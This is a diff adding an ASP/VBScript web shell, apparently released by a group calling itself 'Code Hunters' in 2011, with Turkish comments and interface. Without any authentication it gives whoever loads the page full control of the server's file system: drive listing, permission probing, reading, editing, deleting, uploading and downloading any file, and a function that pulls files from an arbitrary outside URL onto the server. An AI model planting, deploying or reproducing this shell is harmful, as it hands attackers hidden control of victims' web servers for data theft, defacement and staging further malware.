@@ -1,0 +1,713 @@
+' ####
+' ###
+' ###
+' ####
+
+'Karakter Kodlamas
+Session.CodePage=1254
+
+%>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charSet=iso-8859-9">
+</head>
+<style type="text/css">
+body, table{
+background-color:#000;
+color:#00ff00;
+font-family:Verdana, Geneva, sans-serif;
+font-size:12px;
+}
+#baslik{
+font-family:Verdana, Geneva, sans-serif;
+font-size:18px;
+font-weight:bold
+}
+#drivers{
+font-weight:bold
+}
+a{
+color:#00ff00;
+text-decoration:none
+}
+a:hover{
+color:#F00;
+text-decoration:overline underline
+}
+input{
+font-family:tahoma;
+background-color:#000;
+color:#00ff00
+}
+
+div#path{
+position:fixed;
+top:0px;
+left:0px;
+width:100%;
+background-color:#000;
+height:55px;
+font-size:10px;
+z-index:5;
+font-weight:bold;
+color:#00ff00;
+padding-left:5px;
+font-size:12px;
+font-family:tahoma
+}
+
+* html div#path{
+position: absolute !important;
+top: expression(((document.documentElement.scrollTop || document.body.scrollTop) + this.offsetHeight-90) + ""px"");
+left:0px;
+width:100%;
+background-color:#000;
+height:25px;
+font-size:10px;
+z-index:5;
+font-weight:bold;
+color:#00ff00;
+padding-left:5px
+}
+
+</style>
+<script>
+function CodeHuntersPopup(){
+yeniPencere = window.open('', 'hakkimizda','height=300,width=600,resizable=0,status=0,left=100,top=50,scrollbars=0,menubar=0,toolbar=0');
+yeniPencere.document.write('<style type="text/css">body{background-color:#000;color:#00ff00;font-family:Verdana, Geneva, sans-serif;font-size:12px;}</style><br><br><br>')}
+</script>
+<body>
+<br><br><br><br>
+<div id="baslik" align="center"><img src="http://i52.tinypic.com/xn6tft.jpg" style="cursor:pointer" alt="" title="" onclick="CodeHuntersPopup()"></div><br>
+<br>
+<%
+'Dosya Yolu Urlden ?ekiliyor / karakteri \ karakteri olarak de?itiriliyor
+Path=Replace(Request.QueryString("Path"),"/","\")
+
+
+islem=Request.QueryString("islem")
+
+'Fso nesnesini oluturuyoruz.
+Set Fso=Server.Createobject("Scripting.FileSystemObject")
+
+'E?er dosyayolu bo ise dosya yolu shellimizin bulundu?u klas?re ayarlanyor
+
+If Path="" Then
+Path = Server.Mappath("/")
+
+ElseIf FSO.FolderExists(Path)=false Then
+If islem="" Then
+Path = FSO.GetParentFolderName(path)
+End If
+
+End If
+
+'Code Hunters TIM 2011
+
+If islem="" And Not Right(Path,1)="\" Then
+Path = Path & "\"
+End If
+
+
+If islem<>"" Then
+Dizin = Mid(Path,1,Instrrev(Path,"\"))
+Else
+Dizin = Path
+End If
+
+' Sayfann ?st?nde Sabit Duracak Olan Dizin Formu yazdrlyor
+Response.Write("<div id=""path""><form action=""?islem=git"" method=""post""> Bulundu?unuz Dizin <input type=""text"" name=""path"" size=""90"" value="""&Dizin&"""><input type=""submit"" value=""Git""> <a href=""?islem=Upload&Path="&Path&""">Upload</a> | <a href=""?islem=Search&Path="&Path&""">Dosya Arama</a> | <a href=""?islem=Dosyaindir&Path="&Path&""">Dosya Indir</a></form><a href=""?Path="" style=""font-weight:bold;text-decoration:underline"">ROOT(Ana Klas?r)</a>")&vbcrlf
+
+' Fso ile Serverdaki S?r?c?lere Ulayoruz
+Set Suruculer = FSO.Drives
+
+If Not islem="Drivers" Then
+
+Response.Write " || <span id=""drivers""><a href=""?islem=Drivers"" style=""text-decoration:underline"">S?r?c?ler:</a> </span>"
+' Serverda ki Mevcut S?r?c?ler Yazdrlyor
+For Each Surucu in Suruculer
+Response.Write ("<a href=""?Path="&Surucu.DriveLetter&":"" style=""text-decoration:underline"">"&Surucu.DriveLetter&":\</a> ")&vbcrlf
+Next
+
+End If
+
+
+On Error GoTo 0
+On Error Resume Next
+Response.Write(" Klas?r izinleri: ")
+
+
+'Aa?da ?nce ge?ici bir dosya oluturacaz oluturabiliyor ise yazma yetkisi var yazacak. Dosyay okuyabiliyosa okuma yetkisi var yazacak. Dosyay silebiliyorsa silme yetkisi var yazacak.
+
+'Yazma Yetkisi
+Set DosyaOlustur = Fso.CreateTextFile(Dizin & "\CodeHunters.txt", True)
+Set DosyaOlustur = Nothing
+'Hata verirse yazma yetkisi yok, Hata vermezse yazma yetkisi var
+
+If Err<>0 then
+Response.Write "Yazma Yetkisi Yok | "
+Else
+Response.Write "Yazma Yetkisi Var | "
+End If
+
+' E?er Yazma Yetkisinde Hata verirse silme yetkisinde vermemesi i?in aa?daki kodlar yazyoruz
+
+On Error GoTo 0
+On Error Resume Next
+
+'Okuma Yetkisi
+
+'Dosyay okumak i?in a?yoruz
+'Hata verirse okuma yetkisi yok, Hata vermezse okuma yetkisi var
+
+Set DosyaOku= Fso.OpenTextFile(Dizin & "\CodeHunters.txt")
+Set DosyaOku=Nothing
+
+If Err<>0 then
+Response.Write "Okuma Yetkisi Yok | "
+Else
+Response.Write "Okuma Yetkisi Var | "
+End If
+
+On Error GoTo 0
+On Error Resume Next
+
+'Silme Yetkisi
+
+'Oluturulan Ge?ici Dosya Siliniyor
+'Hata verirse silme yetkisi yok hata vermezse silme yetkisi var
+Fso.DeleteFile Dizin&"\CodeHunters.txt",true
+
+If Err<>0 then
+Response.Write "Silme Yetkisi Yok "
+Else
+Response.Write "Silme Yetkisi Var "
+End If
+
+On Error GoTo 0
+On Error Resume Next
+
+Response.Write("</div>")&vbcrlf
+
+' islem De?ikenine G?re Farkl Sayfalar ?karlyor
+Select Case islem
+Case "git"
+'Dizin formu bu sayfaya yollanyor. Bu sayfada formdan gelen bilgiye g?re kullancy y?nlendiriyor
+If Len(Request.Form("path"))>0 Then
+Response.Redirect("?Path="&Request.Form("path"))
+End If
+Case ""
+
+' Urlden alnan Path Hazr hale getiriliyor
+Set Klasor = FSO.GetFolder(Path)
+
+' Dizindeki Alt Klas?rler ?ekiliyor
+Set AltKlasorler = Klasor.SubFolders
+
+' Dizindeki Dosyalar ?ekiliyor
+Set Dosyalar = Klasor.Files
+
+'?st Klas?r Varsa Link Ayarlanyor
+If Klasor.IsRootFolder = False Then
+Set UstKlasor = Klasor.ParentFolder
+Response.Write "<br><a href=""?Path="& UstKlasor.Path &""">< ?st Klas?re Git</a>"
+End If
+
+Response.Write(" <b>"& Klasor.Path &"</b> | <a href=""?islem=CreateFolder&Path="&Path&""">Klas?r Olutur</a> | <a href=""?islem=CreateFile"">Dosya Olutur</a>" & vbCrLf)
+
+Response.Write("<table width=""95%"" cellpadding=""4"" cellspacing=""1"" >")%><br><br>
+
+<tr style="font-weight:bold; background-color:#484848">
+<td width="30" class="baslik">Isim</TD><td width="15%" class="baslik">Dosya Boyutu</TD><td width="25%" class="baslik">T?r</TD><td width="35%" class="baslik">?lem</TD>
+</tr>
+<%
+' Dizindeki Alt Klas?rleri Yazdryoruz
+For Each AltKlasor In AltKlasorler
+With Response
+.Write("<tr style=""background-color:#313131"" onmouseover=""this.style.background='#444444'"" onmouseout=""this.style.background='#313131'""><td><a href=""?Path="& AltKlasor.Path &""" style=""display:block"">"& AltKlasor.Name &"</a></td>") & vbCrLf
+.Write("<td></td><td>Dosya Klas?r?</td>") & vbCrLf
+.Write("<td><a href=""?islem=FolderRename&path="&AltKlasor.Path&""">Isim De?itir</a> | <a href=""?islem=FolderMove&Path="&AltKlasor.Path&""">Ta</a> | <a href=""?islem=FolderCopy&Path="&AltKlasor.Path&""">Kopyala</a> | <a href=""?islem=FolderDelete&Path="&AltKlasor.Path&""">Sil</a></td></tr>")
+End With
+Next
+
+' Dizindeki Dosyalar Yazdryoruz
+For Each Dosya In Dosyalar
+With Response
+.Write "<tr style=""background-color:#3F3F3F"" onmouseover=""this.style.background='#4B4B4B'"" onmouseout=""this.style.background='#3F3F3F'"">" & vbCrlf
+.Write "<td class=""doslist""><a href=""?islem=Read&Path="& Dosya.path &""" style=""display:block"">"&Dosya.name&"</a></td>" & vbCrlf
+.Write "<td>"& Round(Dosya.Size / 1024) &" KB</td>" & vbCrlf
+.Write "<td>"& Dosya.Type &"</td>" & vbCrlf
+.Write "<td><a href=""?islem=Edit&path="&Path&"\"&Dosya.Name&""">D?zenle</a> | <a href=""?islem=FileRename&path="&Path&"\"&Dosya.Name&""">Isim De?itir</a> | <a href=""?islem=FileMove&Path="&Dosya.Path&""">Ta</a> | <a href=""?islem=FileCopy&Path="&Dosya.Path&""">Kopyala</a> | <a href=""?islem=indir&dosya="&Dosya.Path&""">Indir</a> | <a href=""?islem=FileDelete&Path="&Dosya.Path&""">Sil</a></td>" & vbCrlf
+.Write "</tr>"
+End With
+Next
+Response.Write("</table>")
+
+' Driver ilemleri sayfas
+Case "Drivers"
+
+Set Suruculer = FSO.Drives
+
+' Driver ?Zellikleri
+Dim Drive_Type
+Drive_Type = Array("Bilinmeyen","?karlabilir Disk","Sabit Disk","A? S?r?c?s?","CD-ROM","RAM-Disk")
+
+Response.Write("<table><tr><td valign=""top""><br><span id=""drivers"">S?r?c?ler: </span></td>")&vbcrlf
+
+'B?t?n Driverler okumak i?in d?ng? kuruluyor
+For Each Surucu in Suruculer
+Response.Write ("<td valign=""top""><table><tr><td><a href=""?Path="&Surucu.DriveLetter&":\"">"&Surucu.DriveLetter&":\</a></td></tr>")&vbcrlf
+Response.Write("<tr><td>"&Drive_Type(Surucu.DriveType))&vbcrlf
+
+'E?er s?r?c? hazrsa ilemleri yap
+If Surucu.isready Then
+Response.Write(" ("&Surucu.VolumeName&")</td></tr>")&vbcrlf
+Response.Write("<tr><td >Dosya Sistemi: "&Surucu.FileSystem&"</td></tr>")&vbcrlf
+toplamalan = (Surucu.TotalSize / 1048576)
+bosalan = (Surucu.AvailableSpace / 1048576)
+Response.Write("<tr><td style=""border:solid 1px""><table height=""10"" width="""&(99-int(bosalan/toplamalan*100))&"%"" cellspacing=""0"" cellpadding=""0"" ><tr><td style=""background-color:#0099FF;color:#fff;font-size:10px;font-weight:bold"">%"&(100-int(bosalan/toplamalan*100))&"</td></tr></table></td></tr>")
+Response.Write("<tr><td>Toplam Kapasite: "&Round(toplamalan,1) & " MB</td></tr>")&vbcrlf
+Response.Write("<tr><td>Bo Alan: "&Round(bosalan,1) & " MB</td></tr>")&vbcrlf
+End If
+Response.Write("</table></td>")
+Next
+
+'---
+' Dosya i?eri?ini g?r?nt?leme sayfas
+Case "Read"
+
+' E?er dosya yoksa hata ver ilemi durdur
+If FSO.FileExists(Path)= False Then
+Response.Write("Dosya Bulunamad")
+Response.End
+End If
+
+'Dosyay hazr hale getiriliyor
+Set qa = Fso.GetFile(Path)
+
+Response.Write("<br>"&qa.path&" i?eri?i<br><br><hr><code>")
+'Dosya a?lyor
+Set Ag = qa.OpenAsTextStream(1,0)
+
+'Dosya Bosa Hata Vermesi Engelleniyor
+If Ag.AtEndOfStream Then
+Kod=""
+Else
+'Readall komutuyla dosyann i?eri?i okunuyor
+kod = Server.HTMLEncode(ag.ReadAll)
+End If
+
+' Readall komutuyla dosya i?eri?ini ?ekince d?z yaz eklinde geldi?inden satrlara b?lmek i?in split komutu ile vbcrlf karakteri g?r?len yerlerden par?alama ilemi yapyoruz
+icerik = Split(kod,vbcrlf)
+
+'Split ile par?alanan b?l?mleri aralarna <br> ekleyerek satr haline getiriyoruz
+
+For x=1 to Ubound(icerik)
+Response.Write(icerik(x))&"<br>"&vbcrlf
+Next
+
+Response.Write("</code><hr>")
+
+'---
+' Text, Asp, Php Gibi Uzantl Yaz I?erikli Dosyalarn I?eri?ini D?zenleyen Sayfa)
+Case "Edit"
+If Request.QueryString("action")=1 Then
+'Dosyann varl? kontrol ediliyor
+If FSO.FileExists(Path)= False Then
+Response.Write("Dosya Bulunamad")
+Response.End
+End If
+
+'Dosya hazr hale getiriliyor
+Set qa = Fso.GetFile(Path)
+'Dosya a?lyor
+Set Ag = qa.OpenAsTextStream(2,0)
+'Dosya i?eri?ine formdan yollanan yaz yazlyor
+Ag.WriteLine(Request.Form("texticerik"))
+Response.Write(qa.Name&" Kayt Edildi")
+Ag.Close
+
+Else
+
+'Dosyann varl? kontrole ediliyor
+If FSO.FileExists(Path)= False Then
+Response.Write("Dosya Bulunamad")
+Response.End
+End If
+
+'Dosya hazr hale getiriliyor
+Set qa = Fso.GetFile(Path)
+
+Response.Write("<br>"&qa.Name&" i?eri?i<br>")
+
+'Dosya a?lyor
+Set Ag = qa.OpenAsTextStream(1,0)
+
+'Dosya Bosa Hata vermesi Engelleniyor
+If Ag.AtEndOfStream Then
+Kod=""
+Else
+'Dosya i?eri?i okunuyor kod de?ikenine aktarlyor
+Kod = Server.HTMLEncode(ag.ReadAll)
+End If
+
+Ag.Close
+
+Response.Write("<form action=""?islem=Edit&path="&path&"&action=1"" method=""post""><textarea name=""texticerik"" cols=""80"" rows=""25"">"&kod&"</textarea><br><input type=""submit"" value=""Kaydet""></form>")
+End If
+
+
+'Dosya Ismi De?itirme Sayfas
+Case "FileRename"
+If Request.QueryString("action")=1 Then
+NewName=Request.Form("NewName")
+
+'Dosya hazr hale getiriliyor
+Set FileRename = FSO.GetFile(Path)
+' Dosyaya Yeni isim veriliyor
+FileRename.Name=Trim(NewName)
+
+Response.Write("<br>Dosya ismi <b>"&Trim(NewName)&"</b> Olarak De?itirildi")
+Else
+oldname=Mid(Path,Instrrev(path,"\")+1,Len(path))
+Response.Write("<br><form action=""?islem=FileRename&path="&path&"&action=1"" method=""post""><table><tr><td>Mevcut Isim: </td><td>"&oldname&"</td></tr><tr><td>Yeni isim: </td><td><input type=""text"" name=""newname""></td><tr><tr><td><input type=""submit"" value=""Kaydet""></td></tr></table></form>")
+End If
+
+
+'Klas?r Ismi De?itirme Sayfas
+Case "FolderRename"
+
+If Request.QueryString("action")=1 Then
+NewName=Request.Form("NewName")
+
+'Klas?r hazr hale getiriliyor
+Set FolderRename = FSO.GetFolder(Path)
+
+'Klas?re yeni isim veriliyor
+FolderRename.Name=Trim(NewName)
+
+Response.Write("<br>Dosya ismi <b>"&Trim(NewName)&"</b> Olarak De?itirildi")
+Else
+oldname=Mid(Path,Instrrev(Left(path,Len(Path)-1),"\")+1,Len(path))
+Response.Write("<br><form action=""?islem=FolderRename&path="&path&"&action=1"" method=""post""><table><tr><td>Mevcut Isim: </td><td>"&oldname&"</td></tr><tr><td>Yeni isim: </td><td><input type=""text"" name=""newname""></td><tr><tr><td><input type=""submit"" value=""Kaydet""></td></tr></table></form>")
+End If
+
+'Klas?r Tama Sayfas
+Case "FolderMove"
+'Klas?r?n varl? kontrol ediliyor
+If FSO.FolderExists(Path)=False Then
+Response.Write("<br>Klas?r Bulunamad")
+Response.End
+End If
+
+If Request.QueryString("action")=1 Then
+
+Set KlasorTasi = FSO.GetFolder(Path)
+
+Hedef=Request.Form("hedef")
+
+'Klas?r Tanyor
+KlasorTasi.Move Hedef
+Response.Write "Klas?r "& Hedef & " Dizinine Tand"
+Else
+Response.Write Path&" Klas?r?n? Ta<br><br><form action=""?islem=FolderMove&action=1&Path="&Path&""" method=""post""><b>Tanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Dizin&""" size=50><br><input type=""submit"" value=""Ta"" style=""width:100px""></form>"
+End If
+
+
+'Klas?r Kopyalama Sayfas
+Case "FolderCopy"
+'Dosyann varl? kkontrol ediliyor
+If FSO.FolderExists(Path)=False Then
+Response.Write("<br>Klas?r Bulunamad")
+Response.End
+End If
+
+If Request.QueryString("action")=1 Then
+
+'Dosya hazr hale getiriliyor
+Set KlasorKopyala = FSO.GetFolder(Path)
+
+Hedef=Request.Form("hedef")
+
+'Dosya kopyalanyor
+KlasorKopyala.Copy Hedef
+
+Response.Write "Klas?r "& Hedef & " Dizinine Kopyaland"
+Else
+Response.Write "<form action=""?islem=FolderCopy&action=1&Path="&Path&""" method=""post""><b>Kopyalanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Path&""" size=50><br><input type=""submit"" value=""Ta"" style=""width:100px""></form>"
+End If
+
+'
+'Dosya Kopyalama Sayfas
+Case "FileCopy"
+
+If FSO.FileExists(Path)=False Then
+Response.Write("<br>Dosya Bulunamad")
+Response.End
+End If
+Set DosyaTasi = FSO.GetFile(Path)
+
+If Request.QueryString("action")=1 Then
+Set DosyaKopyala = FSO.GetFile(Path)
+Hedef=Request.Form("hedef")
+
+DosyaKopyala.Copy Hedef
+Response.Write "Dosya "& Hedef & " Dizinine Kopyaland"
+Else
+Response.Write "<form action=""?islem=FileCopy&action=1&Path="&Path&""" method=""post""><b>Kopyalanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Path&""" size=50><br><input type=""submit"" value=""Ta"" style=""width:100px""></form>"
+End If
+
+'Dosya Tama Sayfas
+Case "FileMove"
+'Dosyann varl? kontrol ediliyor
+If FSO.FileExists(Path)=False Then
+Response.Write("<br>Dosya Bulunamad")
+Response.End
+End If
+'Dosya kullanm i?in hazr hale getiriliyor
+Set DosyaTasi = FSO.GetFile(Path)
+
+If Request.QueryString("action")=1 Then
+
+Hedef=Request.Form("hedef")
+'Dosya tanyor
+DosyaTasi.Move Hedef
+Response.Write "Dosya "& Hedef & " Dizinine Tand"
+Else
+Response.Write Path&" Dosyasn Ta<br><br><form action=""?islem=FileMove&action=1&Path="&Path&""" method=""post""><b>Tanacak Dizin: </b><input type=""text"" name=""hedef"" value="""&DosyaTasi.ParentFolder&""" size=50><br><input type=""submit"" value=""Ta"" style=""width:100px""></form>"
+End If
+
+'Dosya Silme Sayfas
+Case "FileDelete"
+'Dosyann varl? kontrol ediliyor
+If FSO.FileExists(Path)=False Then
+Response.Write("<br>Dosya Bulunamad")
+Response.End
+End If
+
+'Dosya kullanma hazr hale getiriliyor
+Set DosyaSil = FSO.GetFile(Path)
+If Request.QueryString("action")=1 Then
+
+'Dosya siliniyor
+DosyaSil.Delete
+
+Response.Write "Dosya Silindi.<br><br><a href=""?Path="&Mid(Path,1,InStrRev(Path,"\"))&""">Geri D?n</a>"
+Else
+Response.Write("<b>"&Path&"</b><br>Dosyasn Ger?ekten Silmek Istiyor musunuz? <a href=""?islem=FileDelete&action=1&Path="&Path&""">Sil</a> </a>")
+End If
+
+'Klas?r Silme Sayfas
+Case "FolderDelete"
+'Klas?r?n varl? kontrol ediliyor
+If FSO.FolderExists(Path)=False Then
+Response.Write("<br>Klas?r Bulunamad")
+Response.End
+End If
+
+'Klas?r hazr hale getiriliyor
+Set KlasorSil = FSO.GetFolder(Path)
+
+If Request.QueryString("action")=1 Then
+
+'Klas?r siliniyor
+KlasorSil.Delete
+Response.Write "Klas?r Silindi.<br><br><a href=""?Path="&Mid(Path,1,InStrRev(Path,"\"))&""">Geri D?n</a>"
+Else
+Response.Write("<b>"&Path&"</b><br>Klas?r?n? ve I?indeki Dosyalar Ger?ekten Silmek Istiyor musunuz? <a href=""?islem=FolderDelete&action=1&Path="&Path&""">Sil</a> </a>")
+End If
+
+' Klas?r Oluturma Sayfas
+Case "CreateFolder"
+If Request.QueryString("action")=1 Then
+
+'Dosya oluturuluyor
+Fso.CreateFolder Path&"\"&Trim(Request.Form("foldername"))
+
+Response.Write(Path&"\"&Trim(Request.Form("foldername"))&" Klas?r? oluturuldu")
+Else
+Response.Write("<form action=""?islem=CreateFolder&action=1&Path="&Path&""" method=""post"">Klas?r ad: <input type=""text"" name=""foldername""><input type=""submit"" value=""Olutur""></form>")
+End If
+
+' Dosya Oluturma Sayfas
+Case "CreateFile"
+If Request.QueryString("action")=1 Then
+
+DosyaAdi = Request.Form("filename")
+
+'Klas?r? Belirtiyoruz
+Set Klasor = FSO.GetFolder(Path)
+'Dosyay Oluturuyoruz
+Set DosyaOlustur = Klasor.CreateTextFile(DosyaAdi)
+'Dosya i?eri?ini Yazdyoruz
+DosyaOlustur.Write(Request.Form("icerik"))
+
+Response.Write(Path&"\"&DosyaAdi&" Dosyas Oluturuldu")
+
+DosyaOlustur.Close
+Set DosyaOlustur = Nothing
+
+Else
+Response.Write("<form action=""?islem=CreateFile&action=1&Path="&Path&""" method=""post"">Dosya ad ve uzants: <input type=""text"" name=""filename""><br><textarea name=""icerik"" cols=80 rows=25></textarea><br><input style=""width:500px"" type=""submit"" value=""Olutur""></form>")
+End If
+
+'upload ?lemleri
+Case "Upload"
+
+
+Response.Buffer = True
+Response.Expires = 0
+
+Dim oFO, oProps, oFile, i, item, oMyName
+
+Set oFO = New FileUpload
+
+Set oProps = oFO.GetUploadSettings
+with oProps
+.UploadDirectory = Path ' dosyann y?klenece?i yer
+.AllowOverWrite = true
+End with
+Set oProps = Nothing
+oFO.ProcessUpload
+If oFO.TotalFormCount > 0 Then
+If oFO.FileCount > 0 Then
+for i = 1 to oFO.FileCount
+Set oFile = oFO.File(i)
+
+If oFile.ErrorMessage <> "" Then
+Response.Write "&gt; HATA: " & _
+oFile.ErrorMessage & "<BR>"
+Else
+
+oFile.SaveAsFile
+If oFile.UploadSuccessful Then
+Response.Write "&gt; Basariyla Y?klendi<BR>"
+
+Response.Write(" - Dosyanin su an bulundu?u URL:<a href="""&oFile.URLPath&"""><font color=""red"">"& oFile.URLPath & "</font></a><BR>")
+
+Response.Write(" - Dosya tipi: " & oFile.ContentType & "<BR>")
+
+Response.Write(" - Dosya ismi: " & oFile.FileName & "<BR>")
+
+
+Response.Write(" - Dosya boyutu: " & _
+round(formatnumber(oFile.ByteCount, 0)/1024,2) & " KByte<BR>")
+Else
+Response.Write "&gt; Dosyay y?klerken hata olutu: " & _
+oFile.ErrorMessage & "<BR>"
+End If
+End If
+Set oFile = Nothing
+next
+Else
+Response.Write "&gt; Daha ?nceden bu dosya ile ayni boyutta dosya y?klenmis. Bu durumda ayni dosyayi y?kl?yor olabilirsiniz. Eger farkli bir dosya olduguna eminseniz; Dosya boyutunu b?y?ltmek i?in k???k bir text dosyasini doldurarak zip'li dosyaya ekleyiniz."
+End If
+
+
+Response.Write "<BR><BR><A HREF=""?islem=Upload&Path="&Path&""">Tekrar Y?kle</A>"
+Else
+
+oFO.ShowUploadForm
+End If
+
+Set oFO = Nothing
+
+'Dosya Arama
+Case "Search"
+Server.ScriptTimeOut=99999
+If Request.QueryString("action")="1" Then
+
+Search=Request.Form("Search")
+Response.Write "<table width=""95%"" cellpadding=""4"" cellspacing=""1"" align=""left"">"
+Sub DosyaAra(KlasorYolu)
+
+Set DosyaAraKlasor = Fso.GetFolder(KlasorYolu)
+Set SearchSubFolders = DosyaAraKlasor.SubFolders
+Set SearchFiles = DosyaAraKlasor.Files
+
+For Each Dosyax In SearchFiles
+If Instr(Dosyax.Name,Search)>0 Then
+Response.Write "<tr style=""background-color:#3F3F3F"" onmouseover=""this.style.background='#4B4B4B'"" onmouseout=""this.style.background='#3F3F3F'""><td><a href=""?islem=Edit&Path="&Dosyax.Path&""">"&Dosyax.Path&"</a> </td><td>"&Dosyax.Type&"</td></tr>"
+End If
+Next
+
+For Each AltKla In SearchSubFolders
+If Instr(lcase(AltKla.Name),lcase(Search))>0 Then
+Response.Write "<tr style=""background-color:#313131"" onmouseover=""this.style.background='#444444'"" onmouseout=""this.style.background='#313131'""><td><a href=""?Path="&AltKla.Path&""">"&AltKla.Path&"</a> </td><td>"&AltKla.Type&"</td></tr>"
+End If
+DosyaAra AltKla.Path
+Next
+
+End Sub
+
+DosyaAra Path
+
+Else
+Response.Write "<form action=""?islem=Search&action=1&Path="&Path&""" method=""post"">Aranacak Dizin: "&Path&"<br><br>Dosya Adn Veya Uzantsn Yazn <input type=""text"" name=""search""><input type=""submit"" value=""Ara""></form"
+End If
+
+'Dosya indirme sayfas
+Case "indir"
+Response.Buffer = True
+
+Dosya = Request.QueryString("dosya")
+
+Response.Clear
+Response.ContentType = "application/x-msdownload"
+'response.contenttype="application/force-download"
+Response.AddHeader "cache-control","private"
+Response.AddHeader "content-transfer-encoding", "binary"
+Response.AddHeader "content-disposition", "attachment; filename=" & Mid(dosya, instrrev(dosya, "\") + 1, Len(dosya) - instrrev(dosya, "\"))
+Set Dosyaindir = Server.CreateObject("Adodb.Stream")
+Dosyaindir.type = 1
+Dosyaindir.Open
+Dosyaindir.LoadFromFile Dosya
+Response.BinaryWrite Dosyaindir.Read
+
+Dosyaindir.Close
+Set Dosyaindir = Nothing
+Response.End
+
+' Server'a Baka Bir siteden dosya y?kleme sayfas
+Case "Dosyaindir"
+
+Url = Request.Form("url")
+
+If Len(Trim(Url))=0 Then
+
+Response.Write("<form action=""?islem=Dosyaindir&Path="&Path&""" method=""post"">Dosyann indirilece?i dizin: "&Path&"<br><br>Dosya url: <input type=""text"" name=""url""><input type=""submit"" value=""Indir""></form>")
+
+Else
+
+Set XmlHttp = Server.CreateObject("MSXML2.ServerXMLHTTP")
+XmlHttp.Open "GET", Url, False
+XmlHttp.Send
+IndirilenDosya=XmlHttp.ResponseBody
+
+Set BinaryStream = Server.CreateObject("ADODB.Stream")
+BinaryStream.Type = 1
+BinaryStream.Open
+BinaryStream.Write IndirilenDosya
+BinaryStream.SaveToFile Path&"\"&Right(Url,(len(Url)-instrrev(Url,"/"))), 2
+
+Set XmlHttp = Nothing
+Set BinaryStream = Nothing
+
+Response.Write "<strong> Dosya "& Path&"\"&Right(Url,(len(Url)-instrrev(Url,"/"))) &"</strong> klas?r?ne indirildi."
+
+End If
+
+Case "ShellDelete"
+FileName=Request.ServerVariables("SCRIPT_NAME")
+Fso.DeleteFile Server.Mappath("\")&Replace(FileName,"/","\")
+Response.Write("Shell Silindi...")
+End Select
+
+If Err.number<>0 Then
+Response.Write("<br><br><b>"&Err.description&"</b>")
+End If
+%>
+<br><br><br><br>
+
+<center><a href="?islem=ShellDelete" onClick="return confirm('Code Hunters Shell i Ger?ekten Silmek Istiyor musunuz?')"><u>busek</u></a><br>
+<br><u>
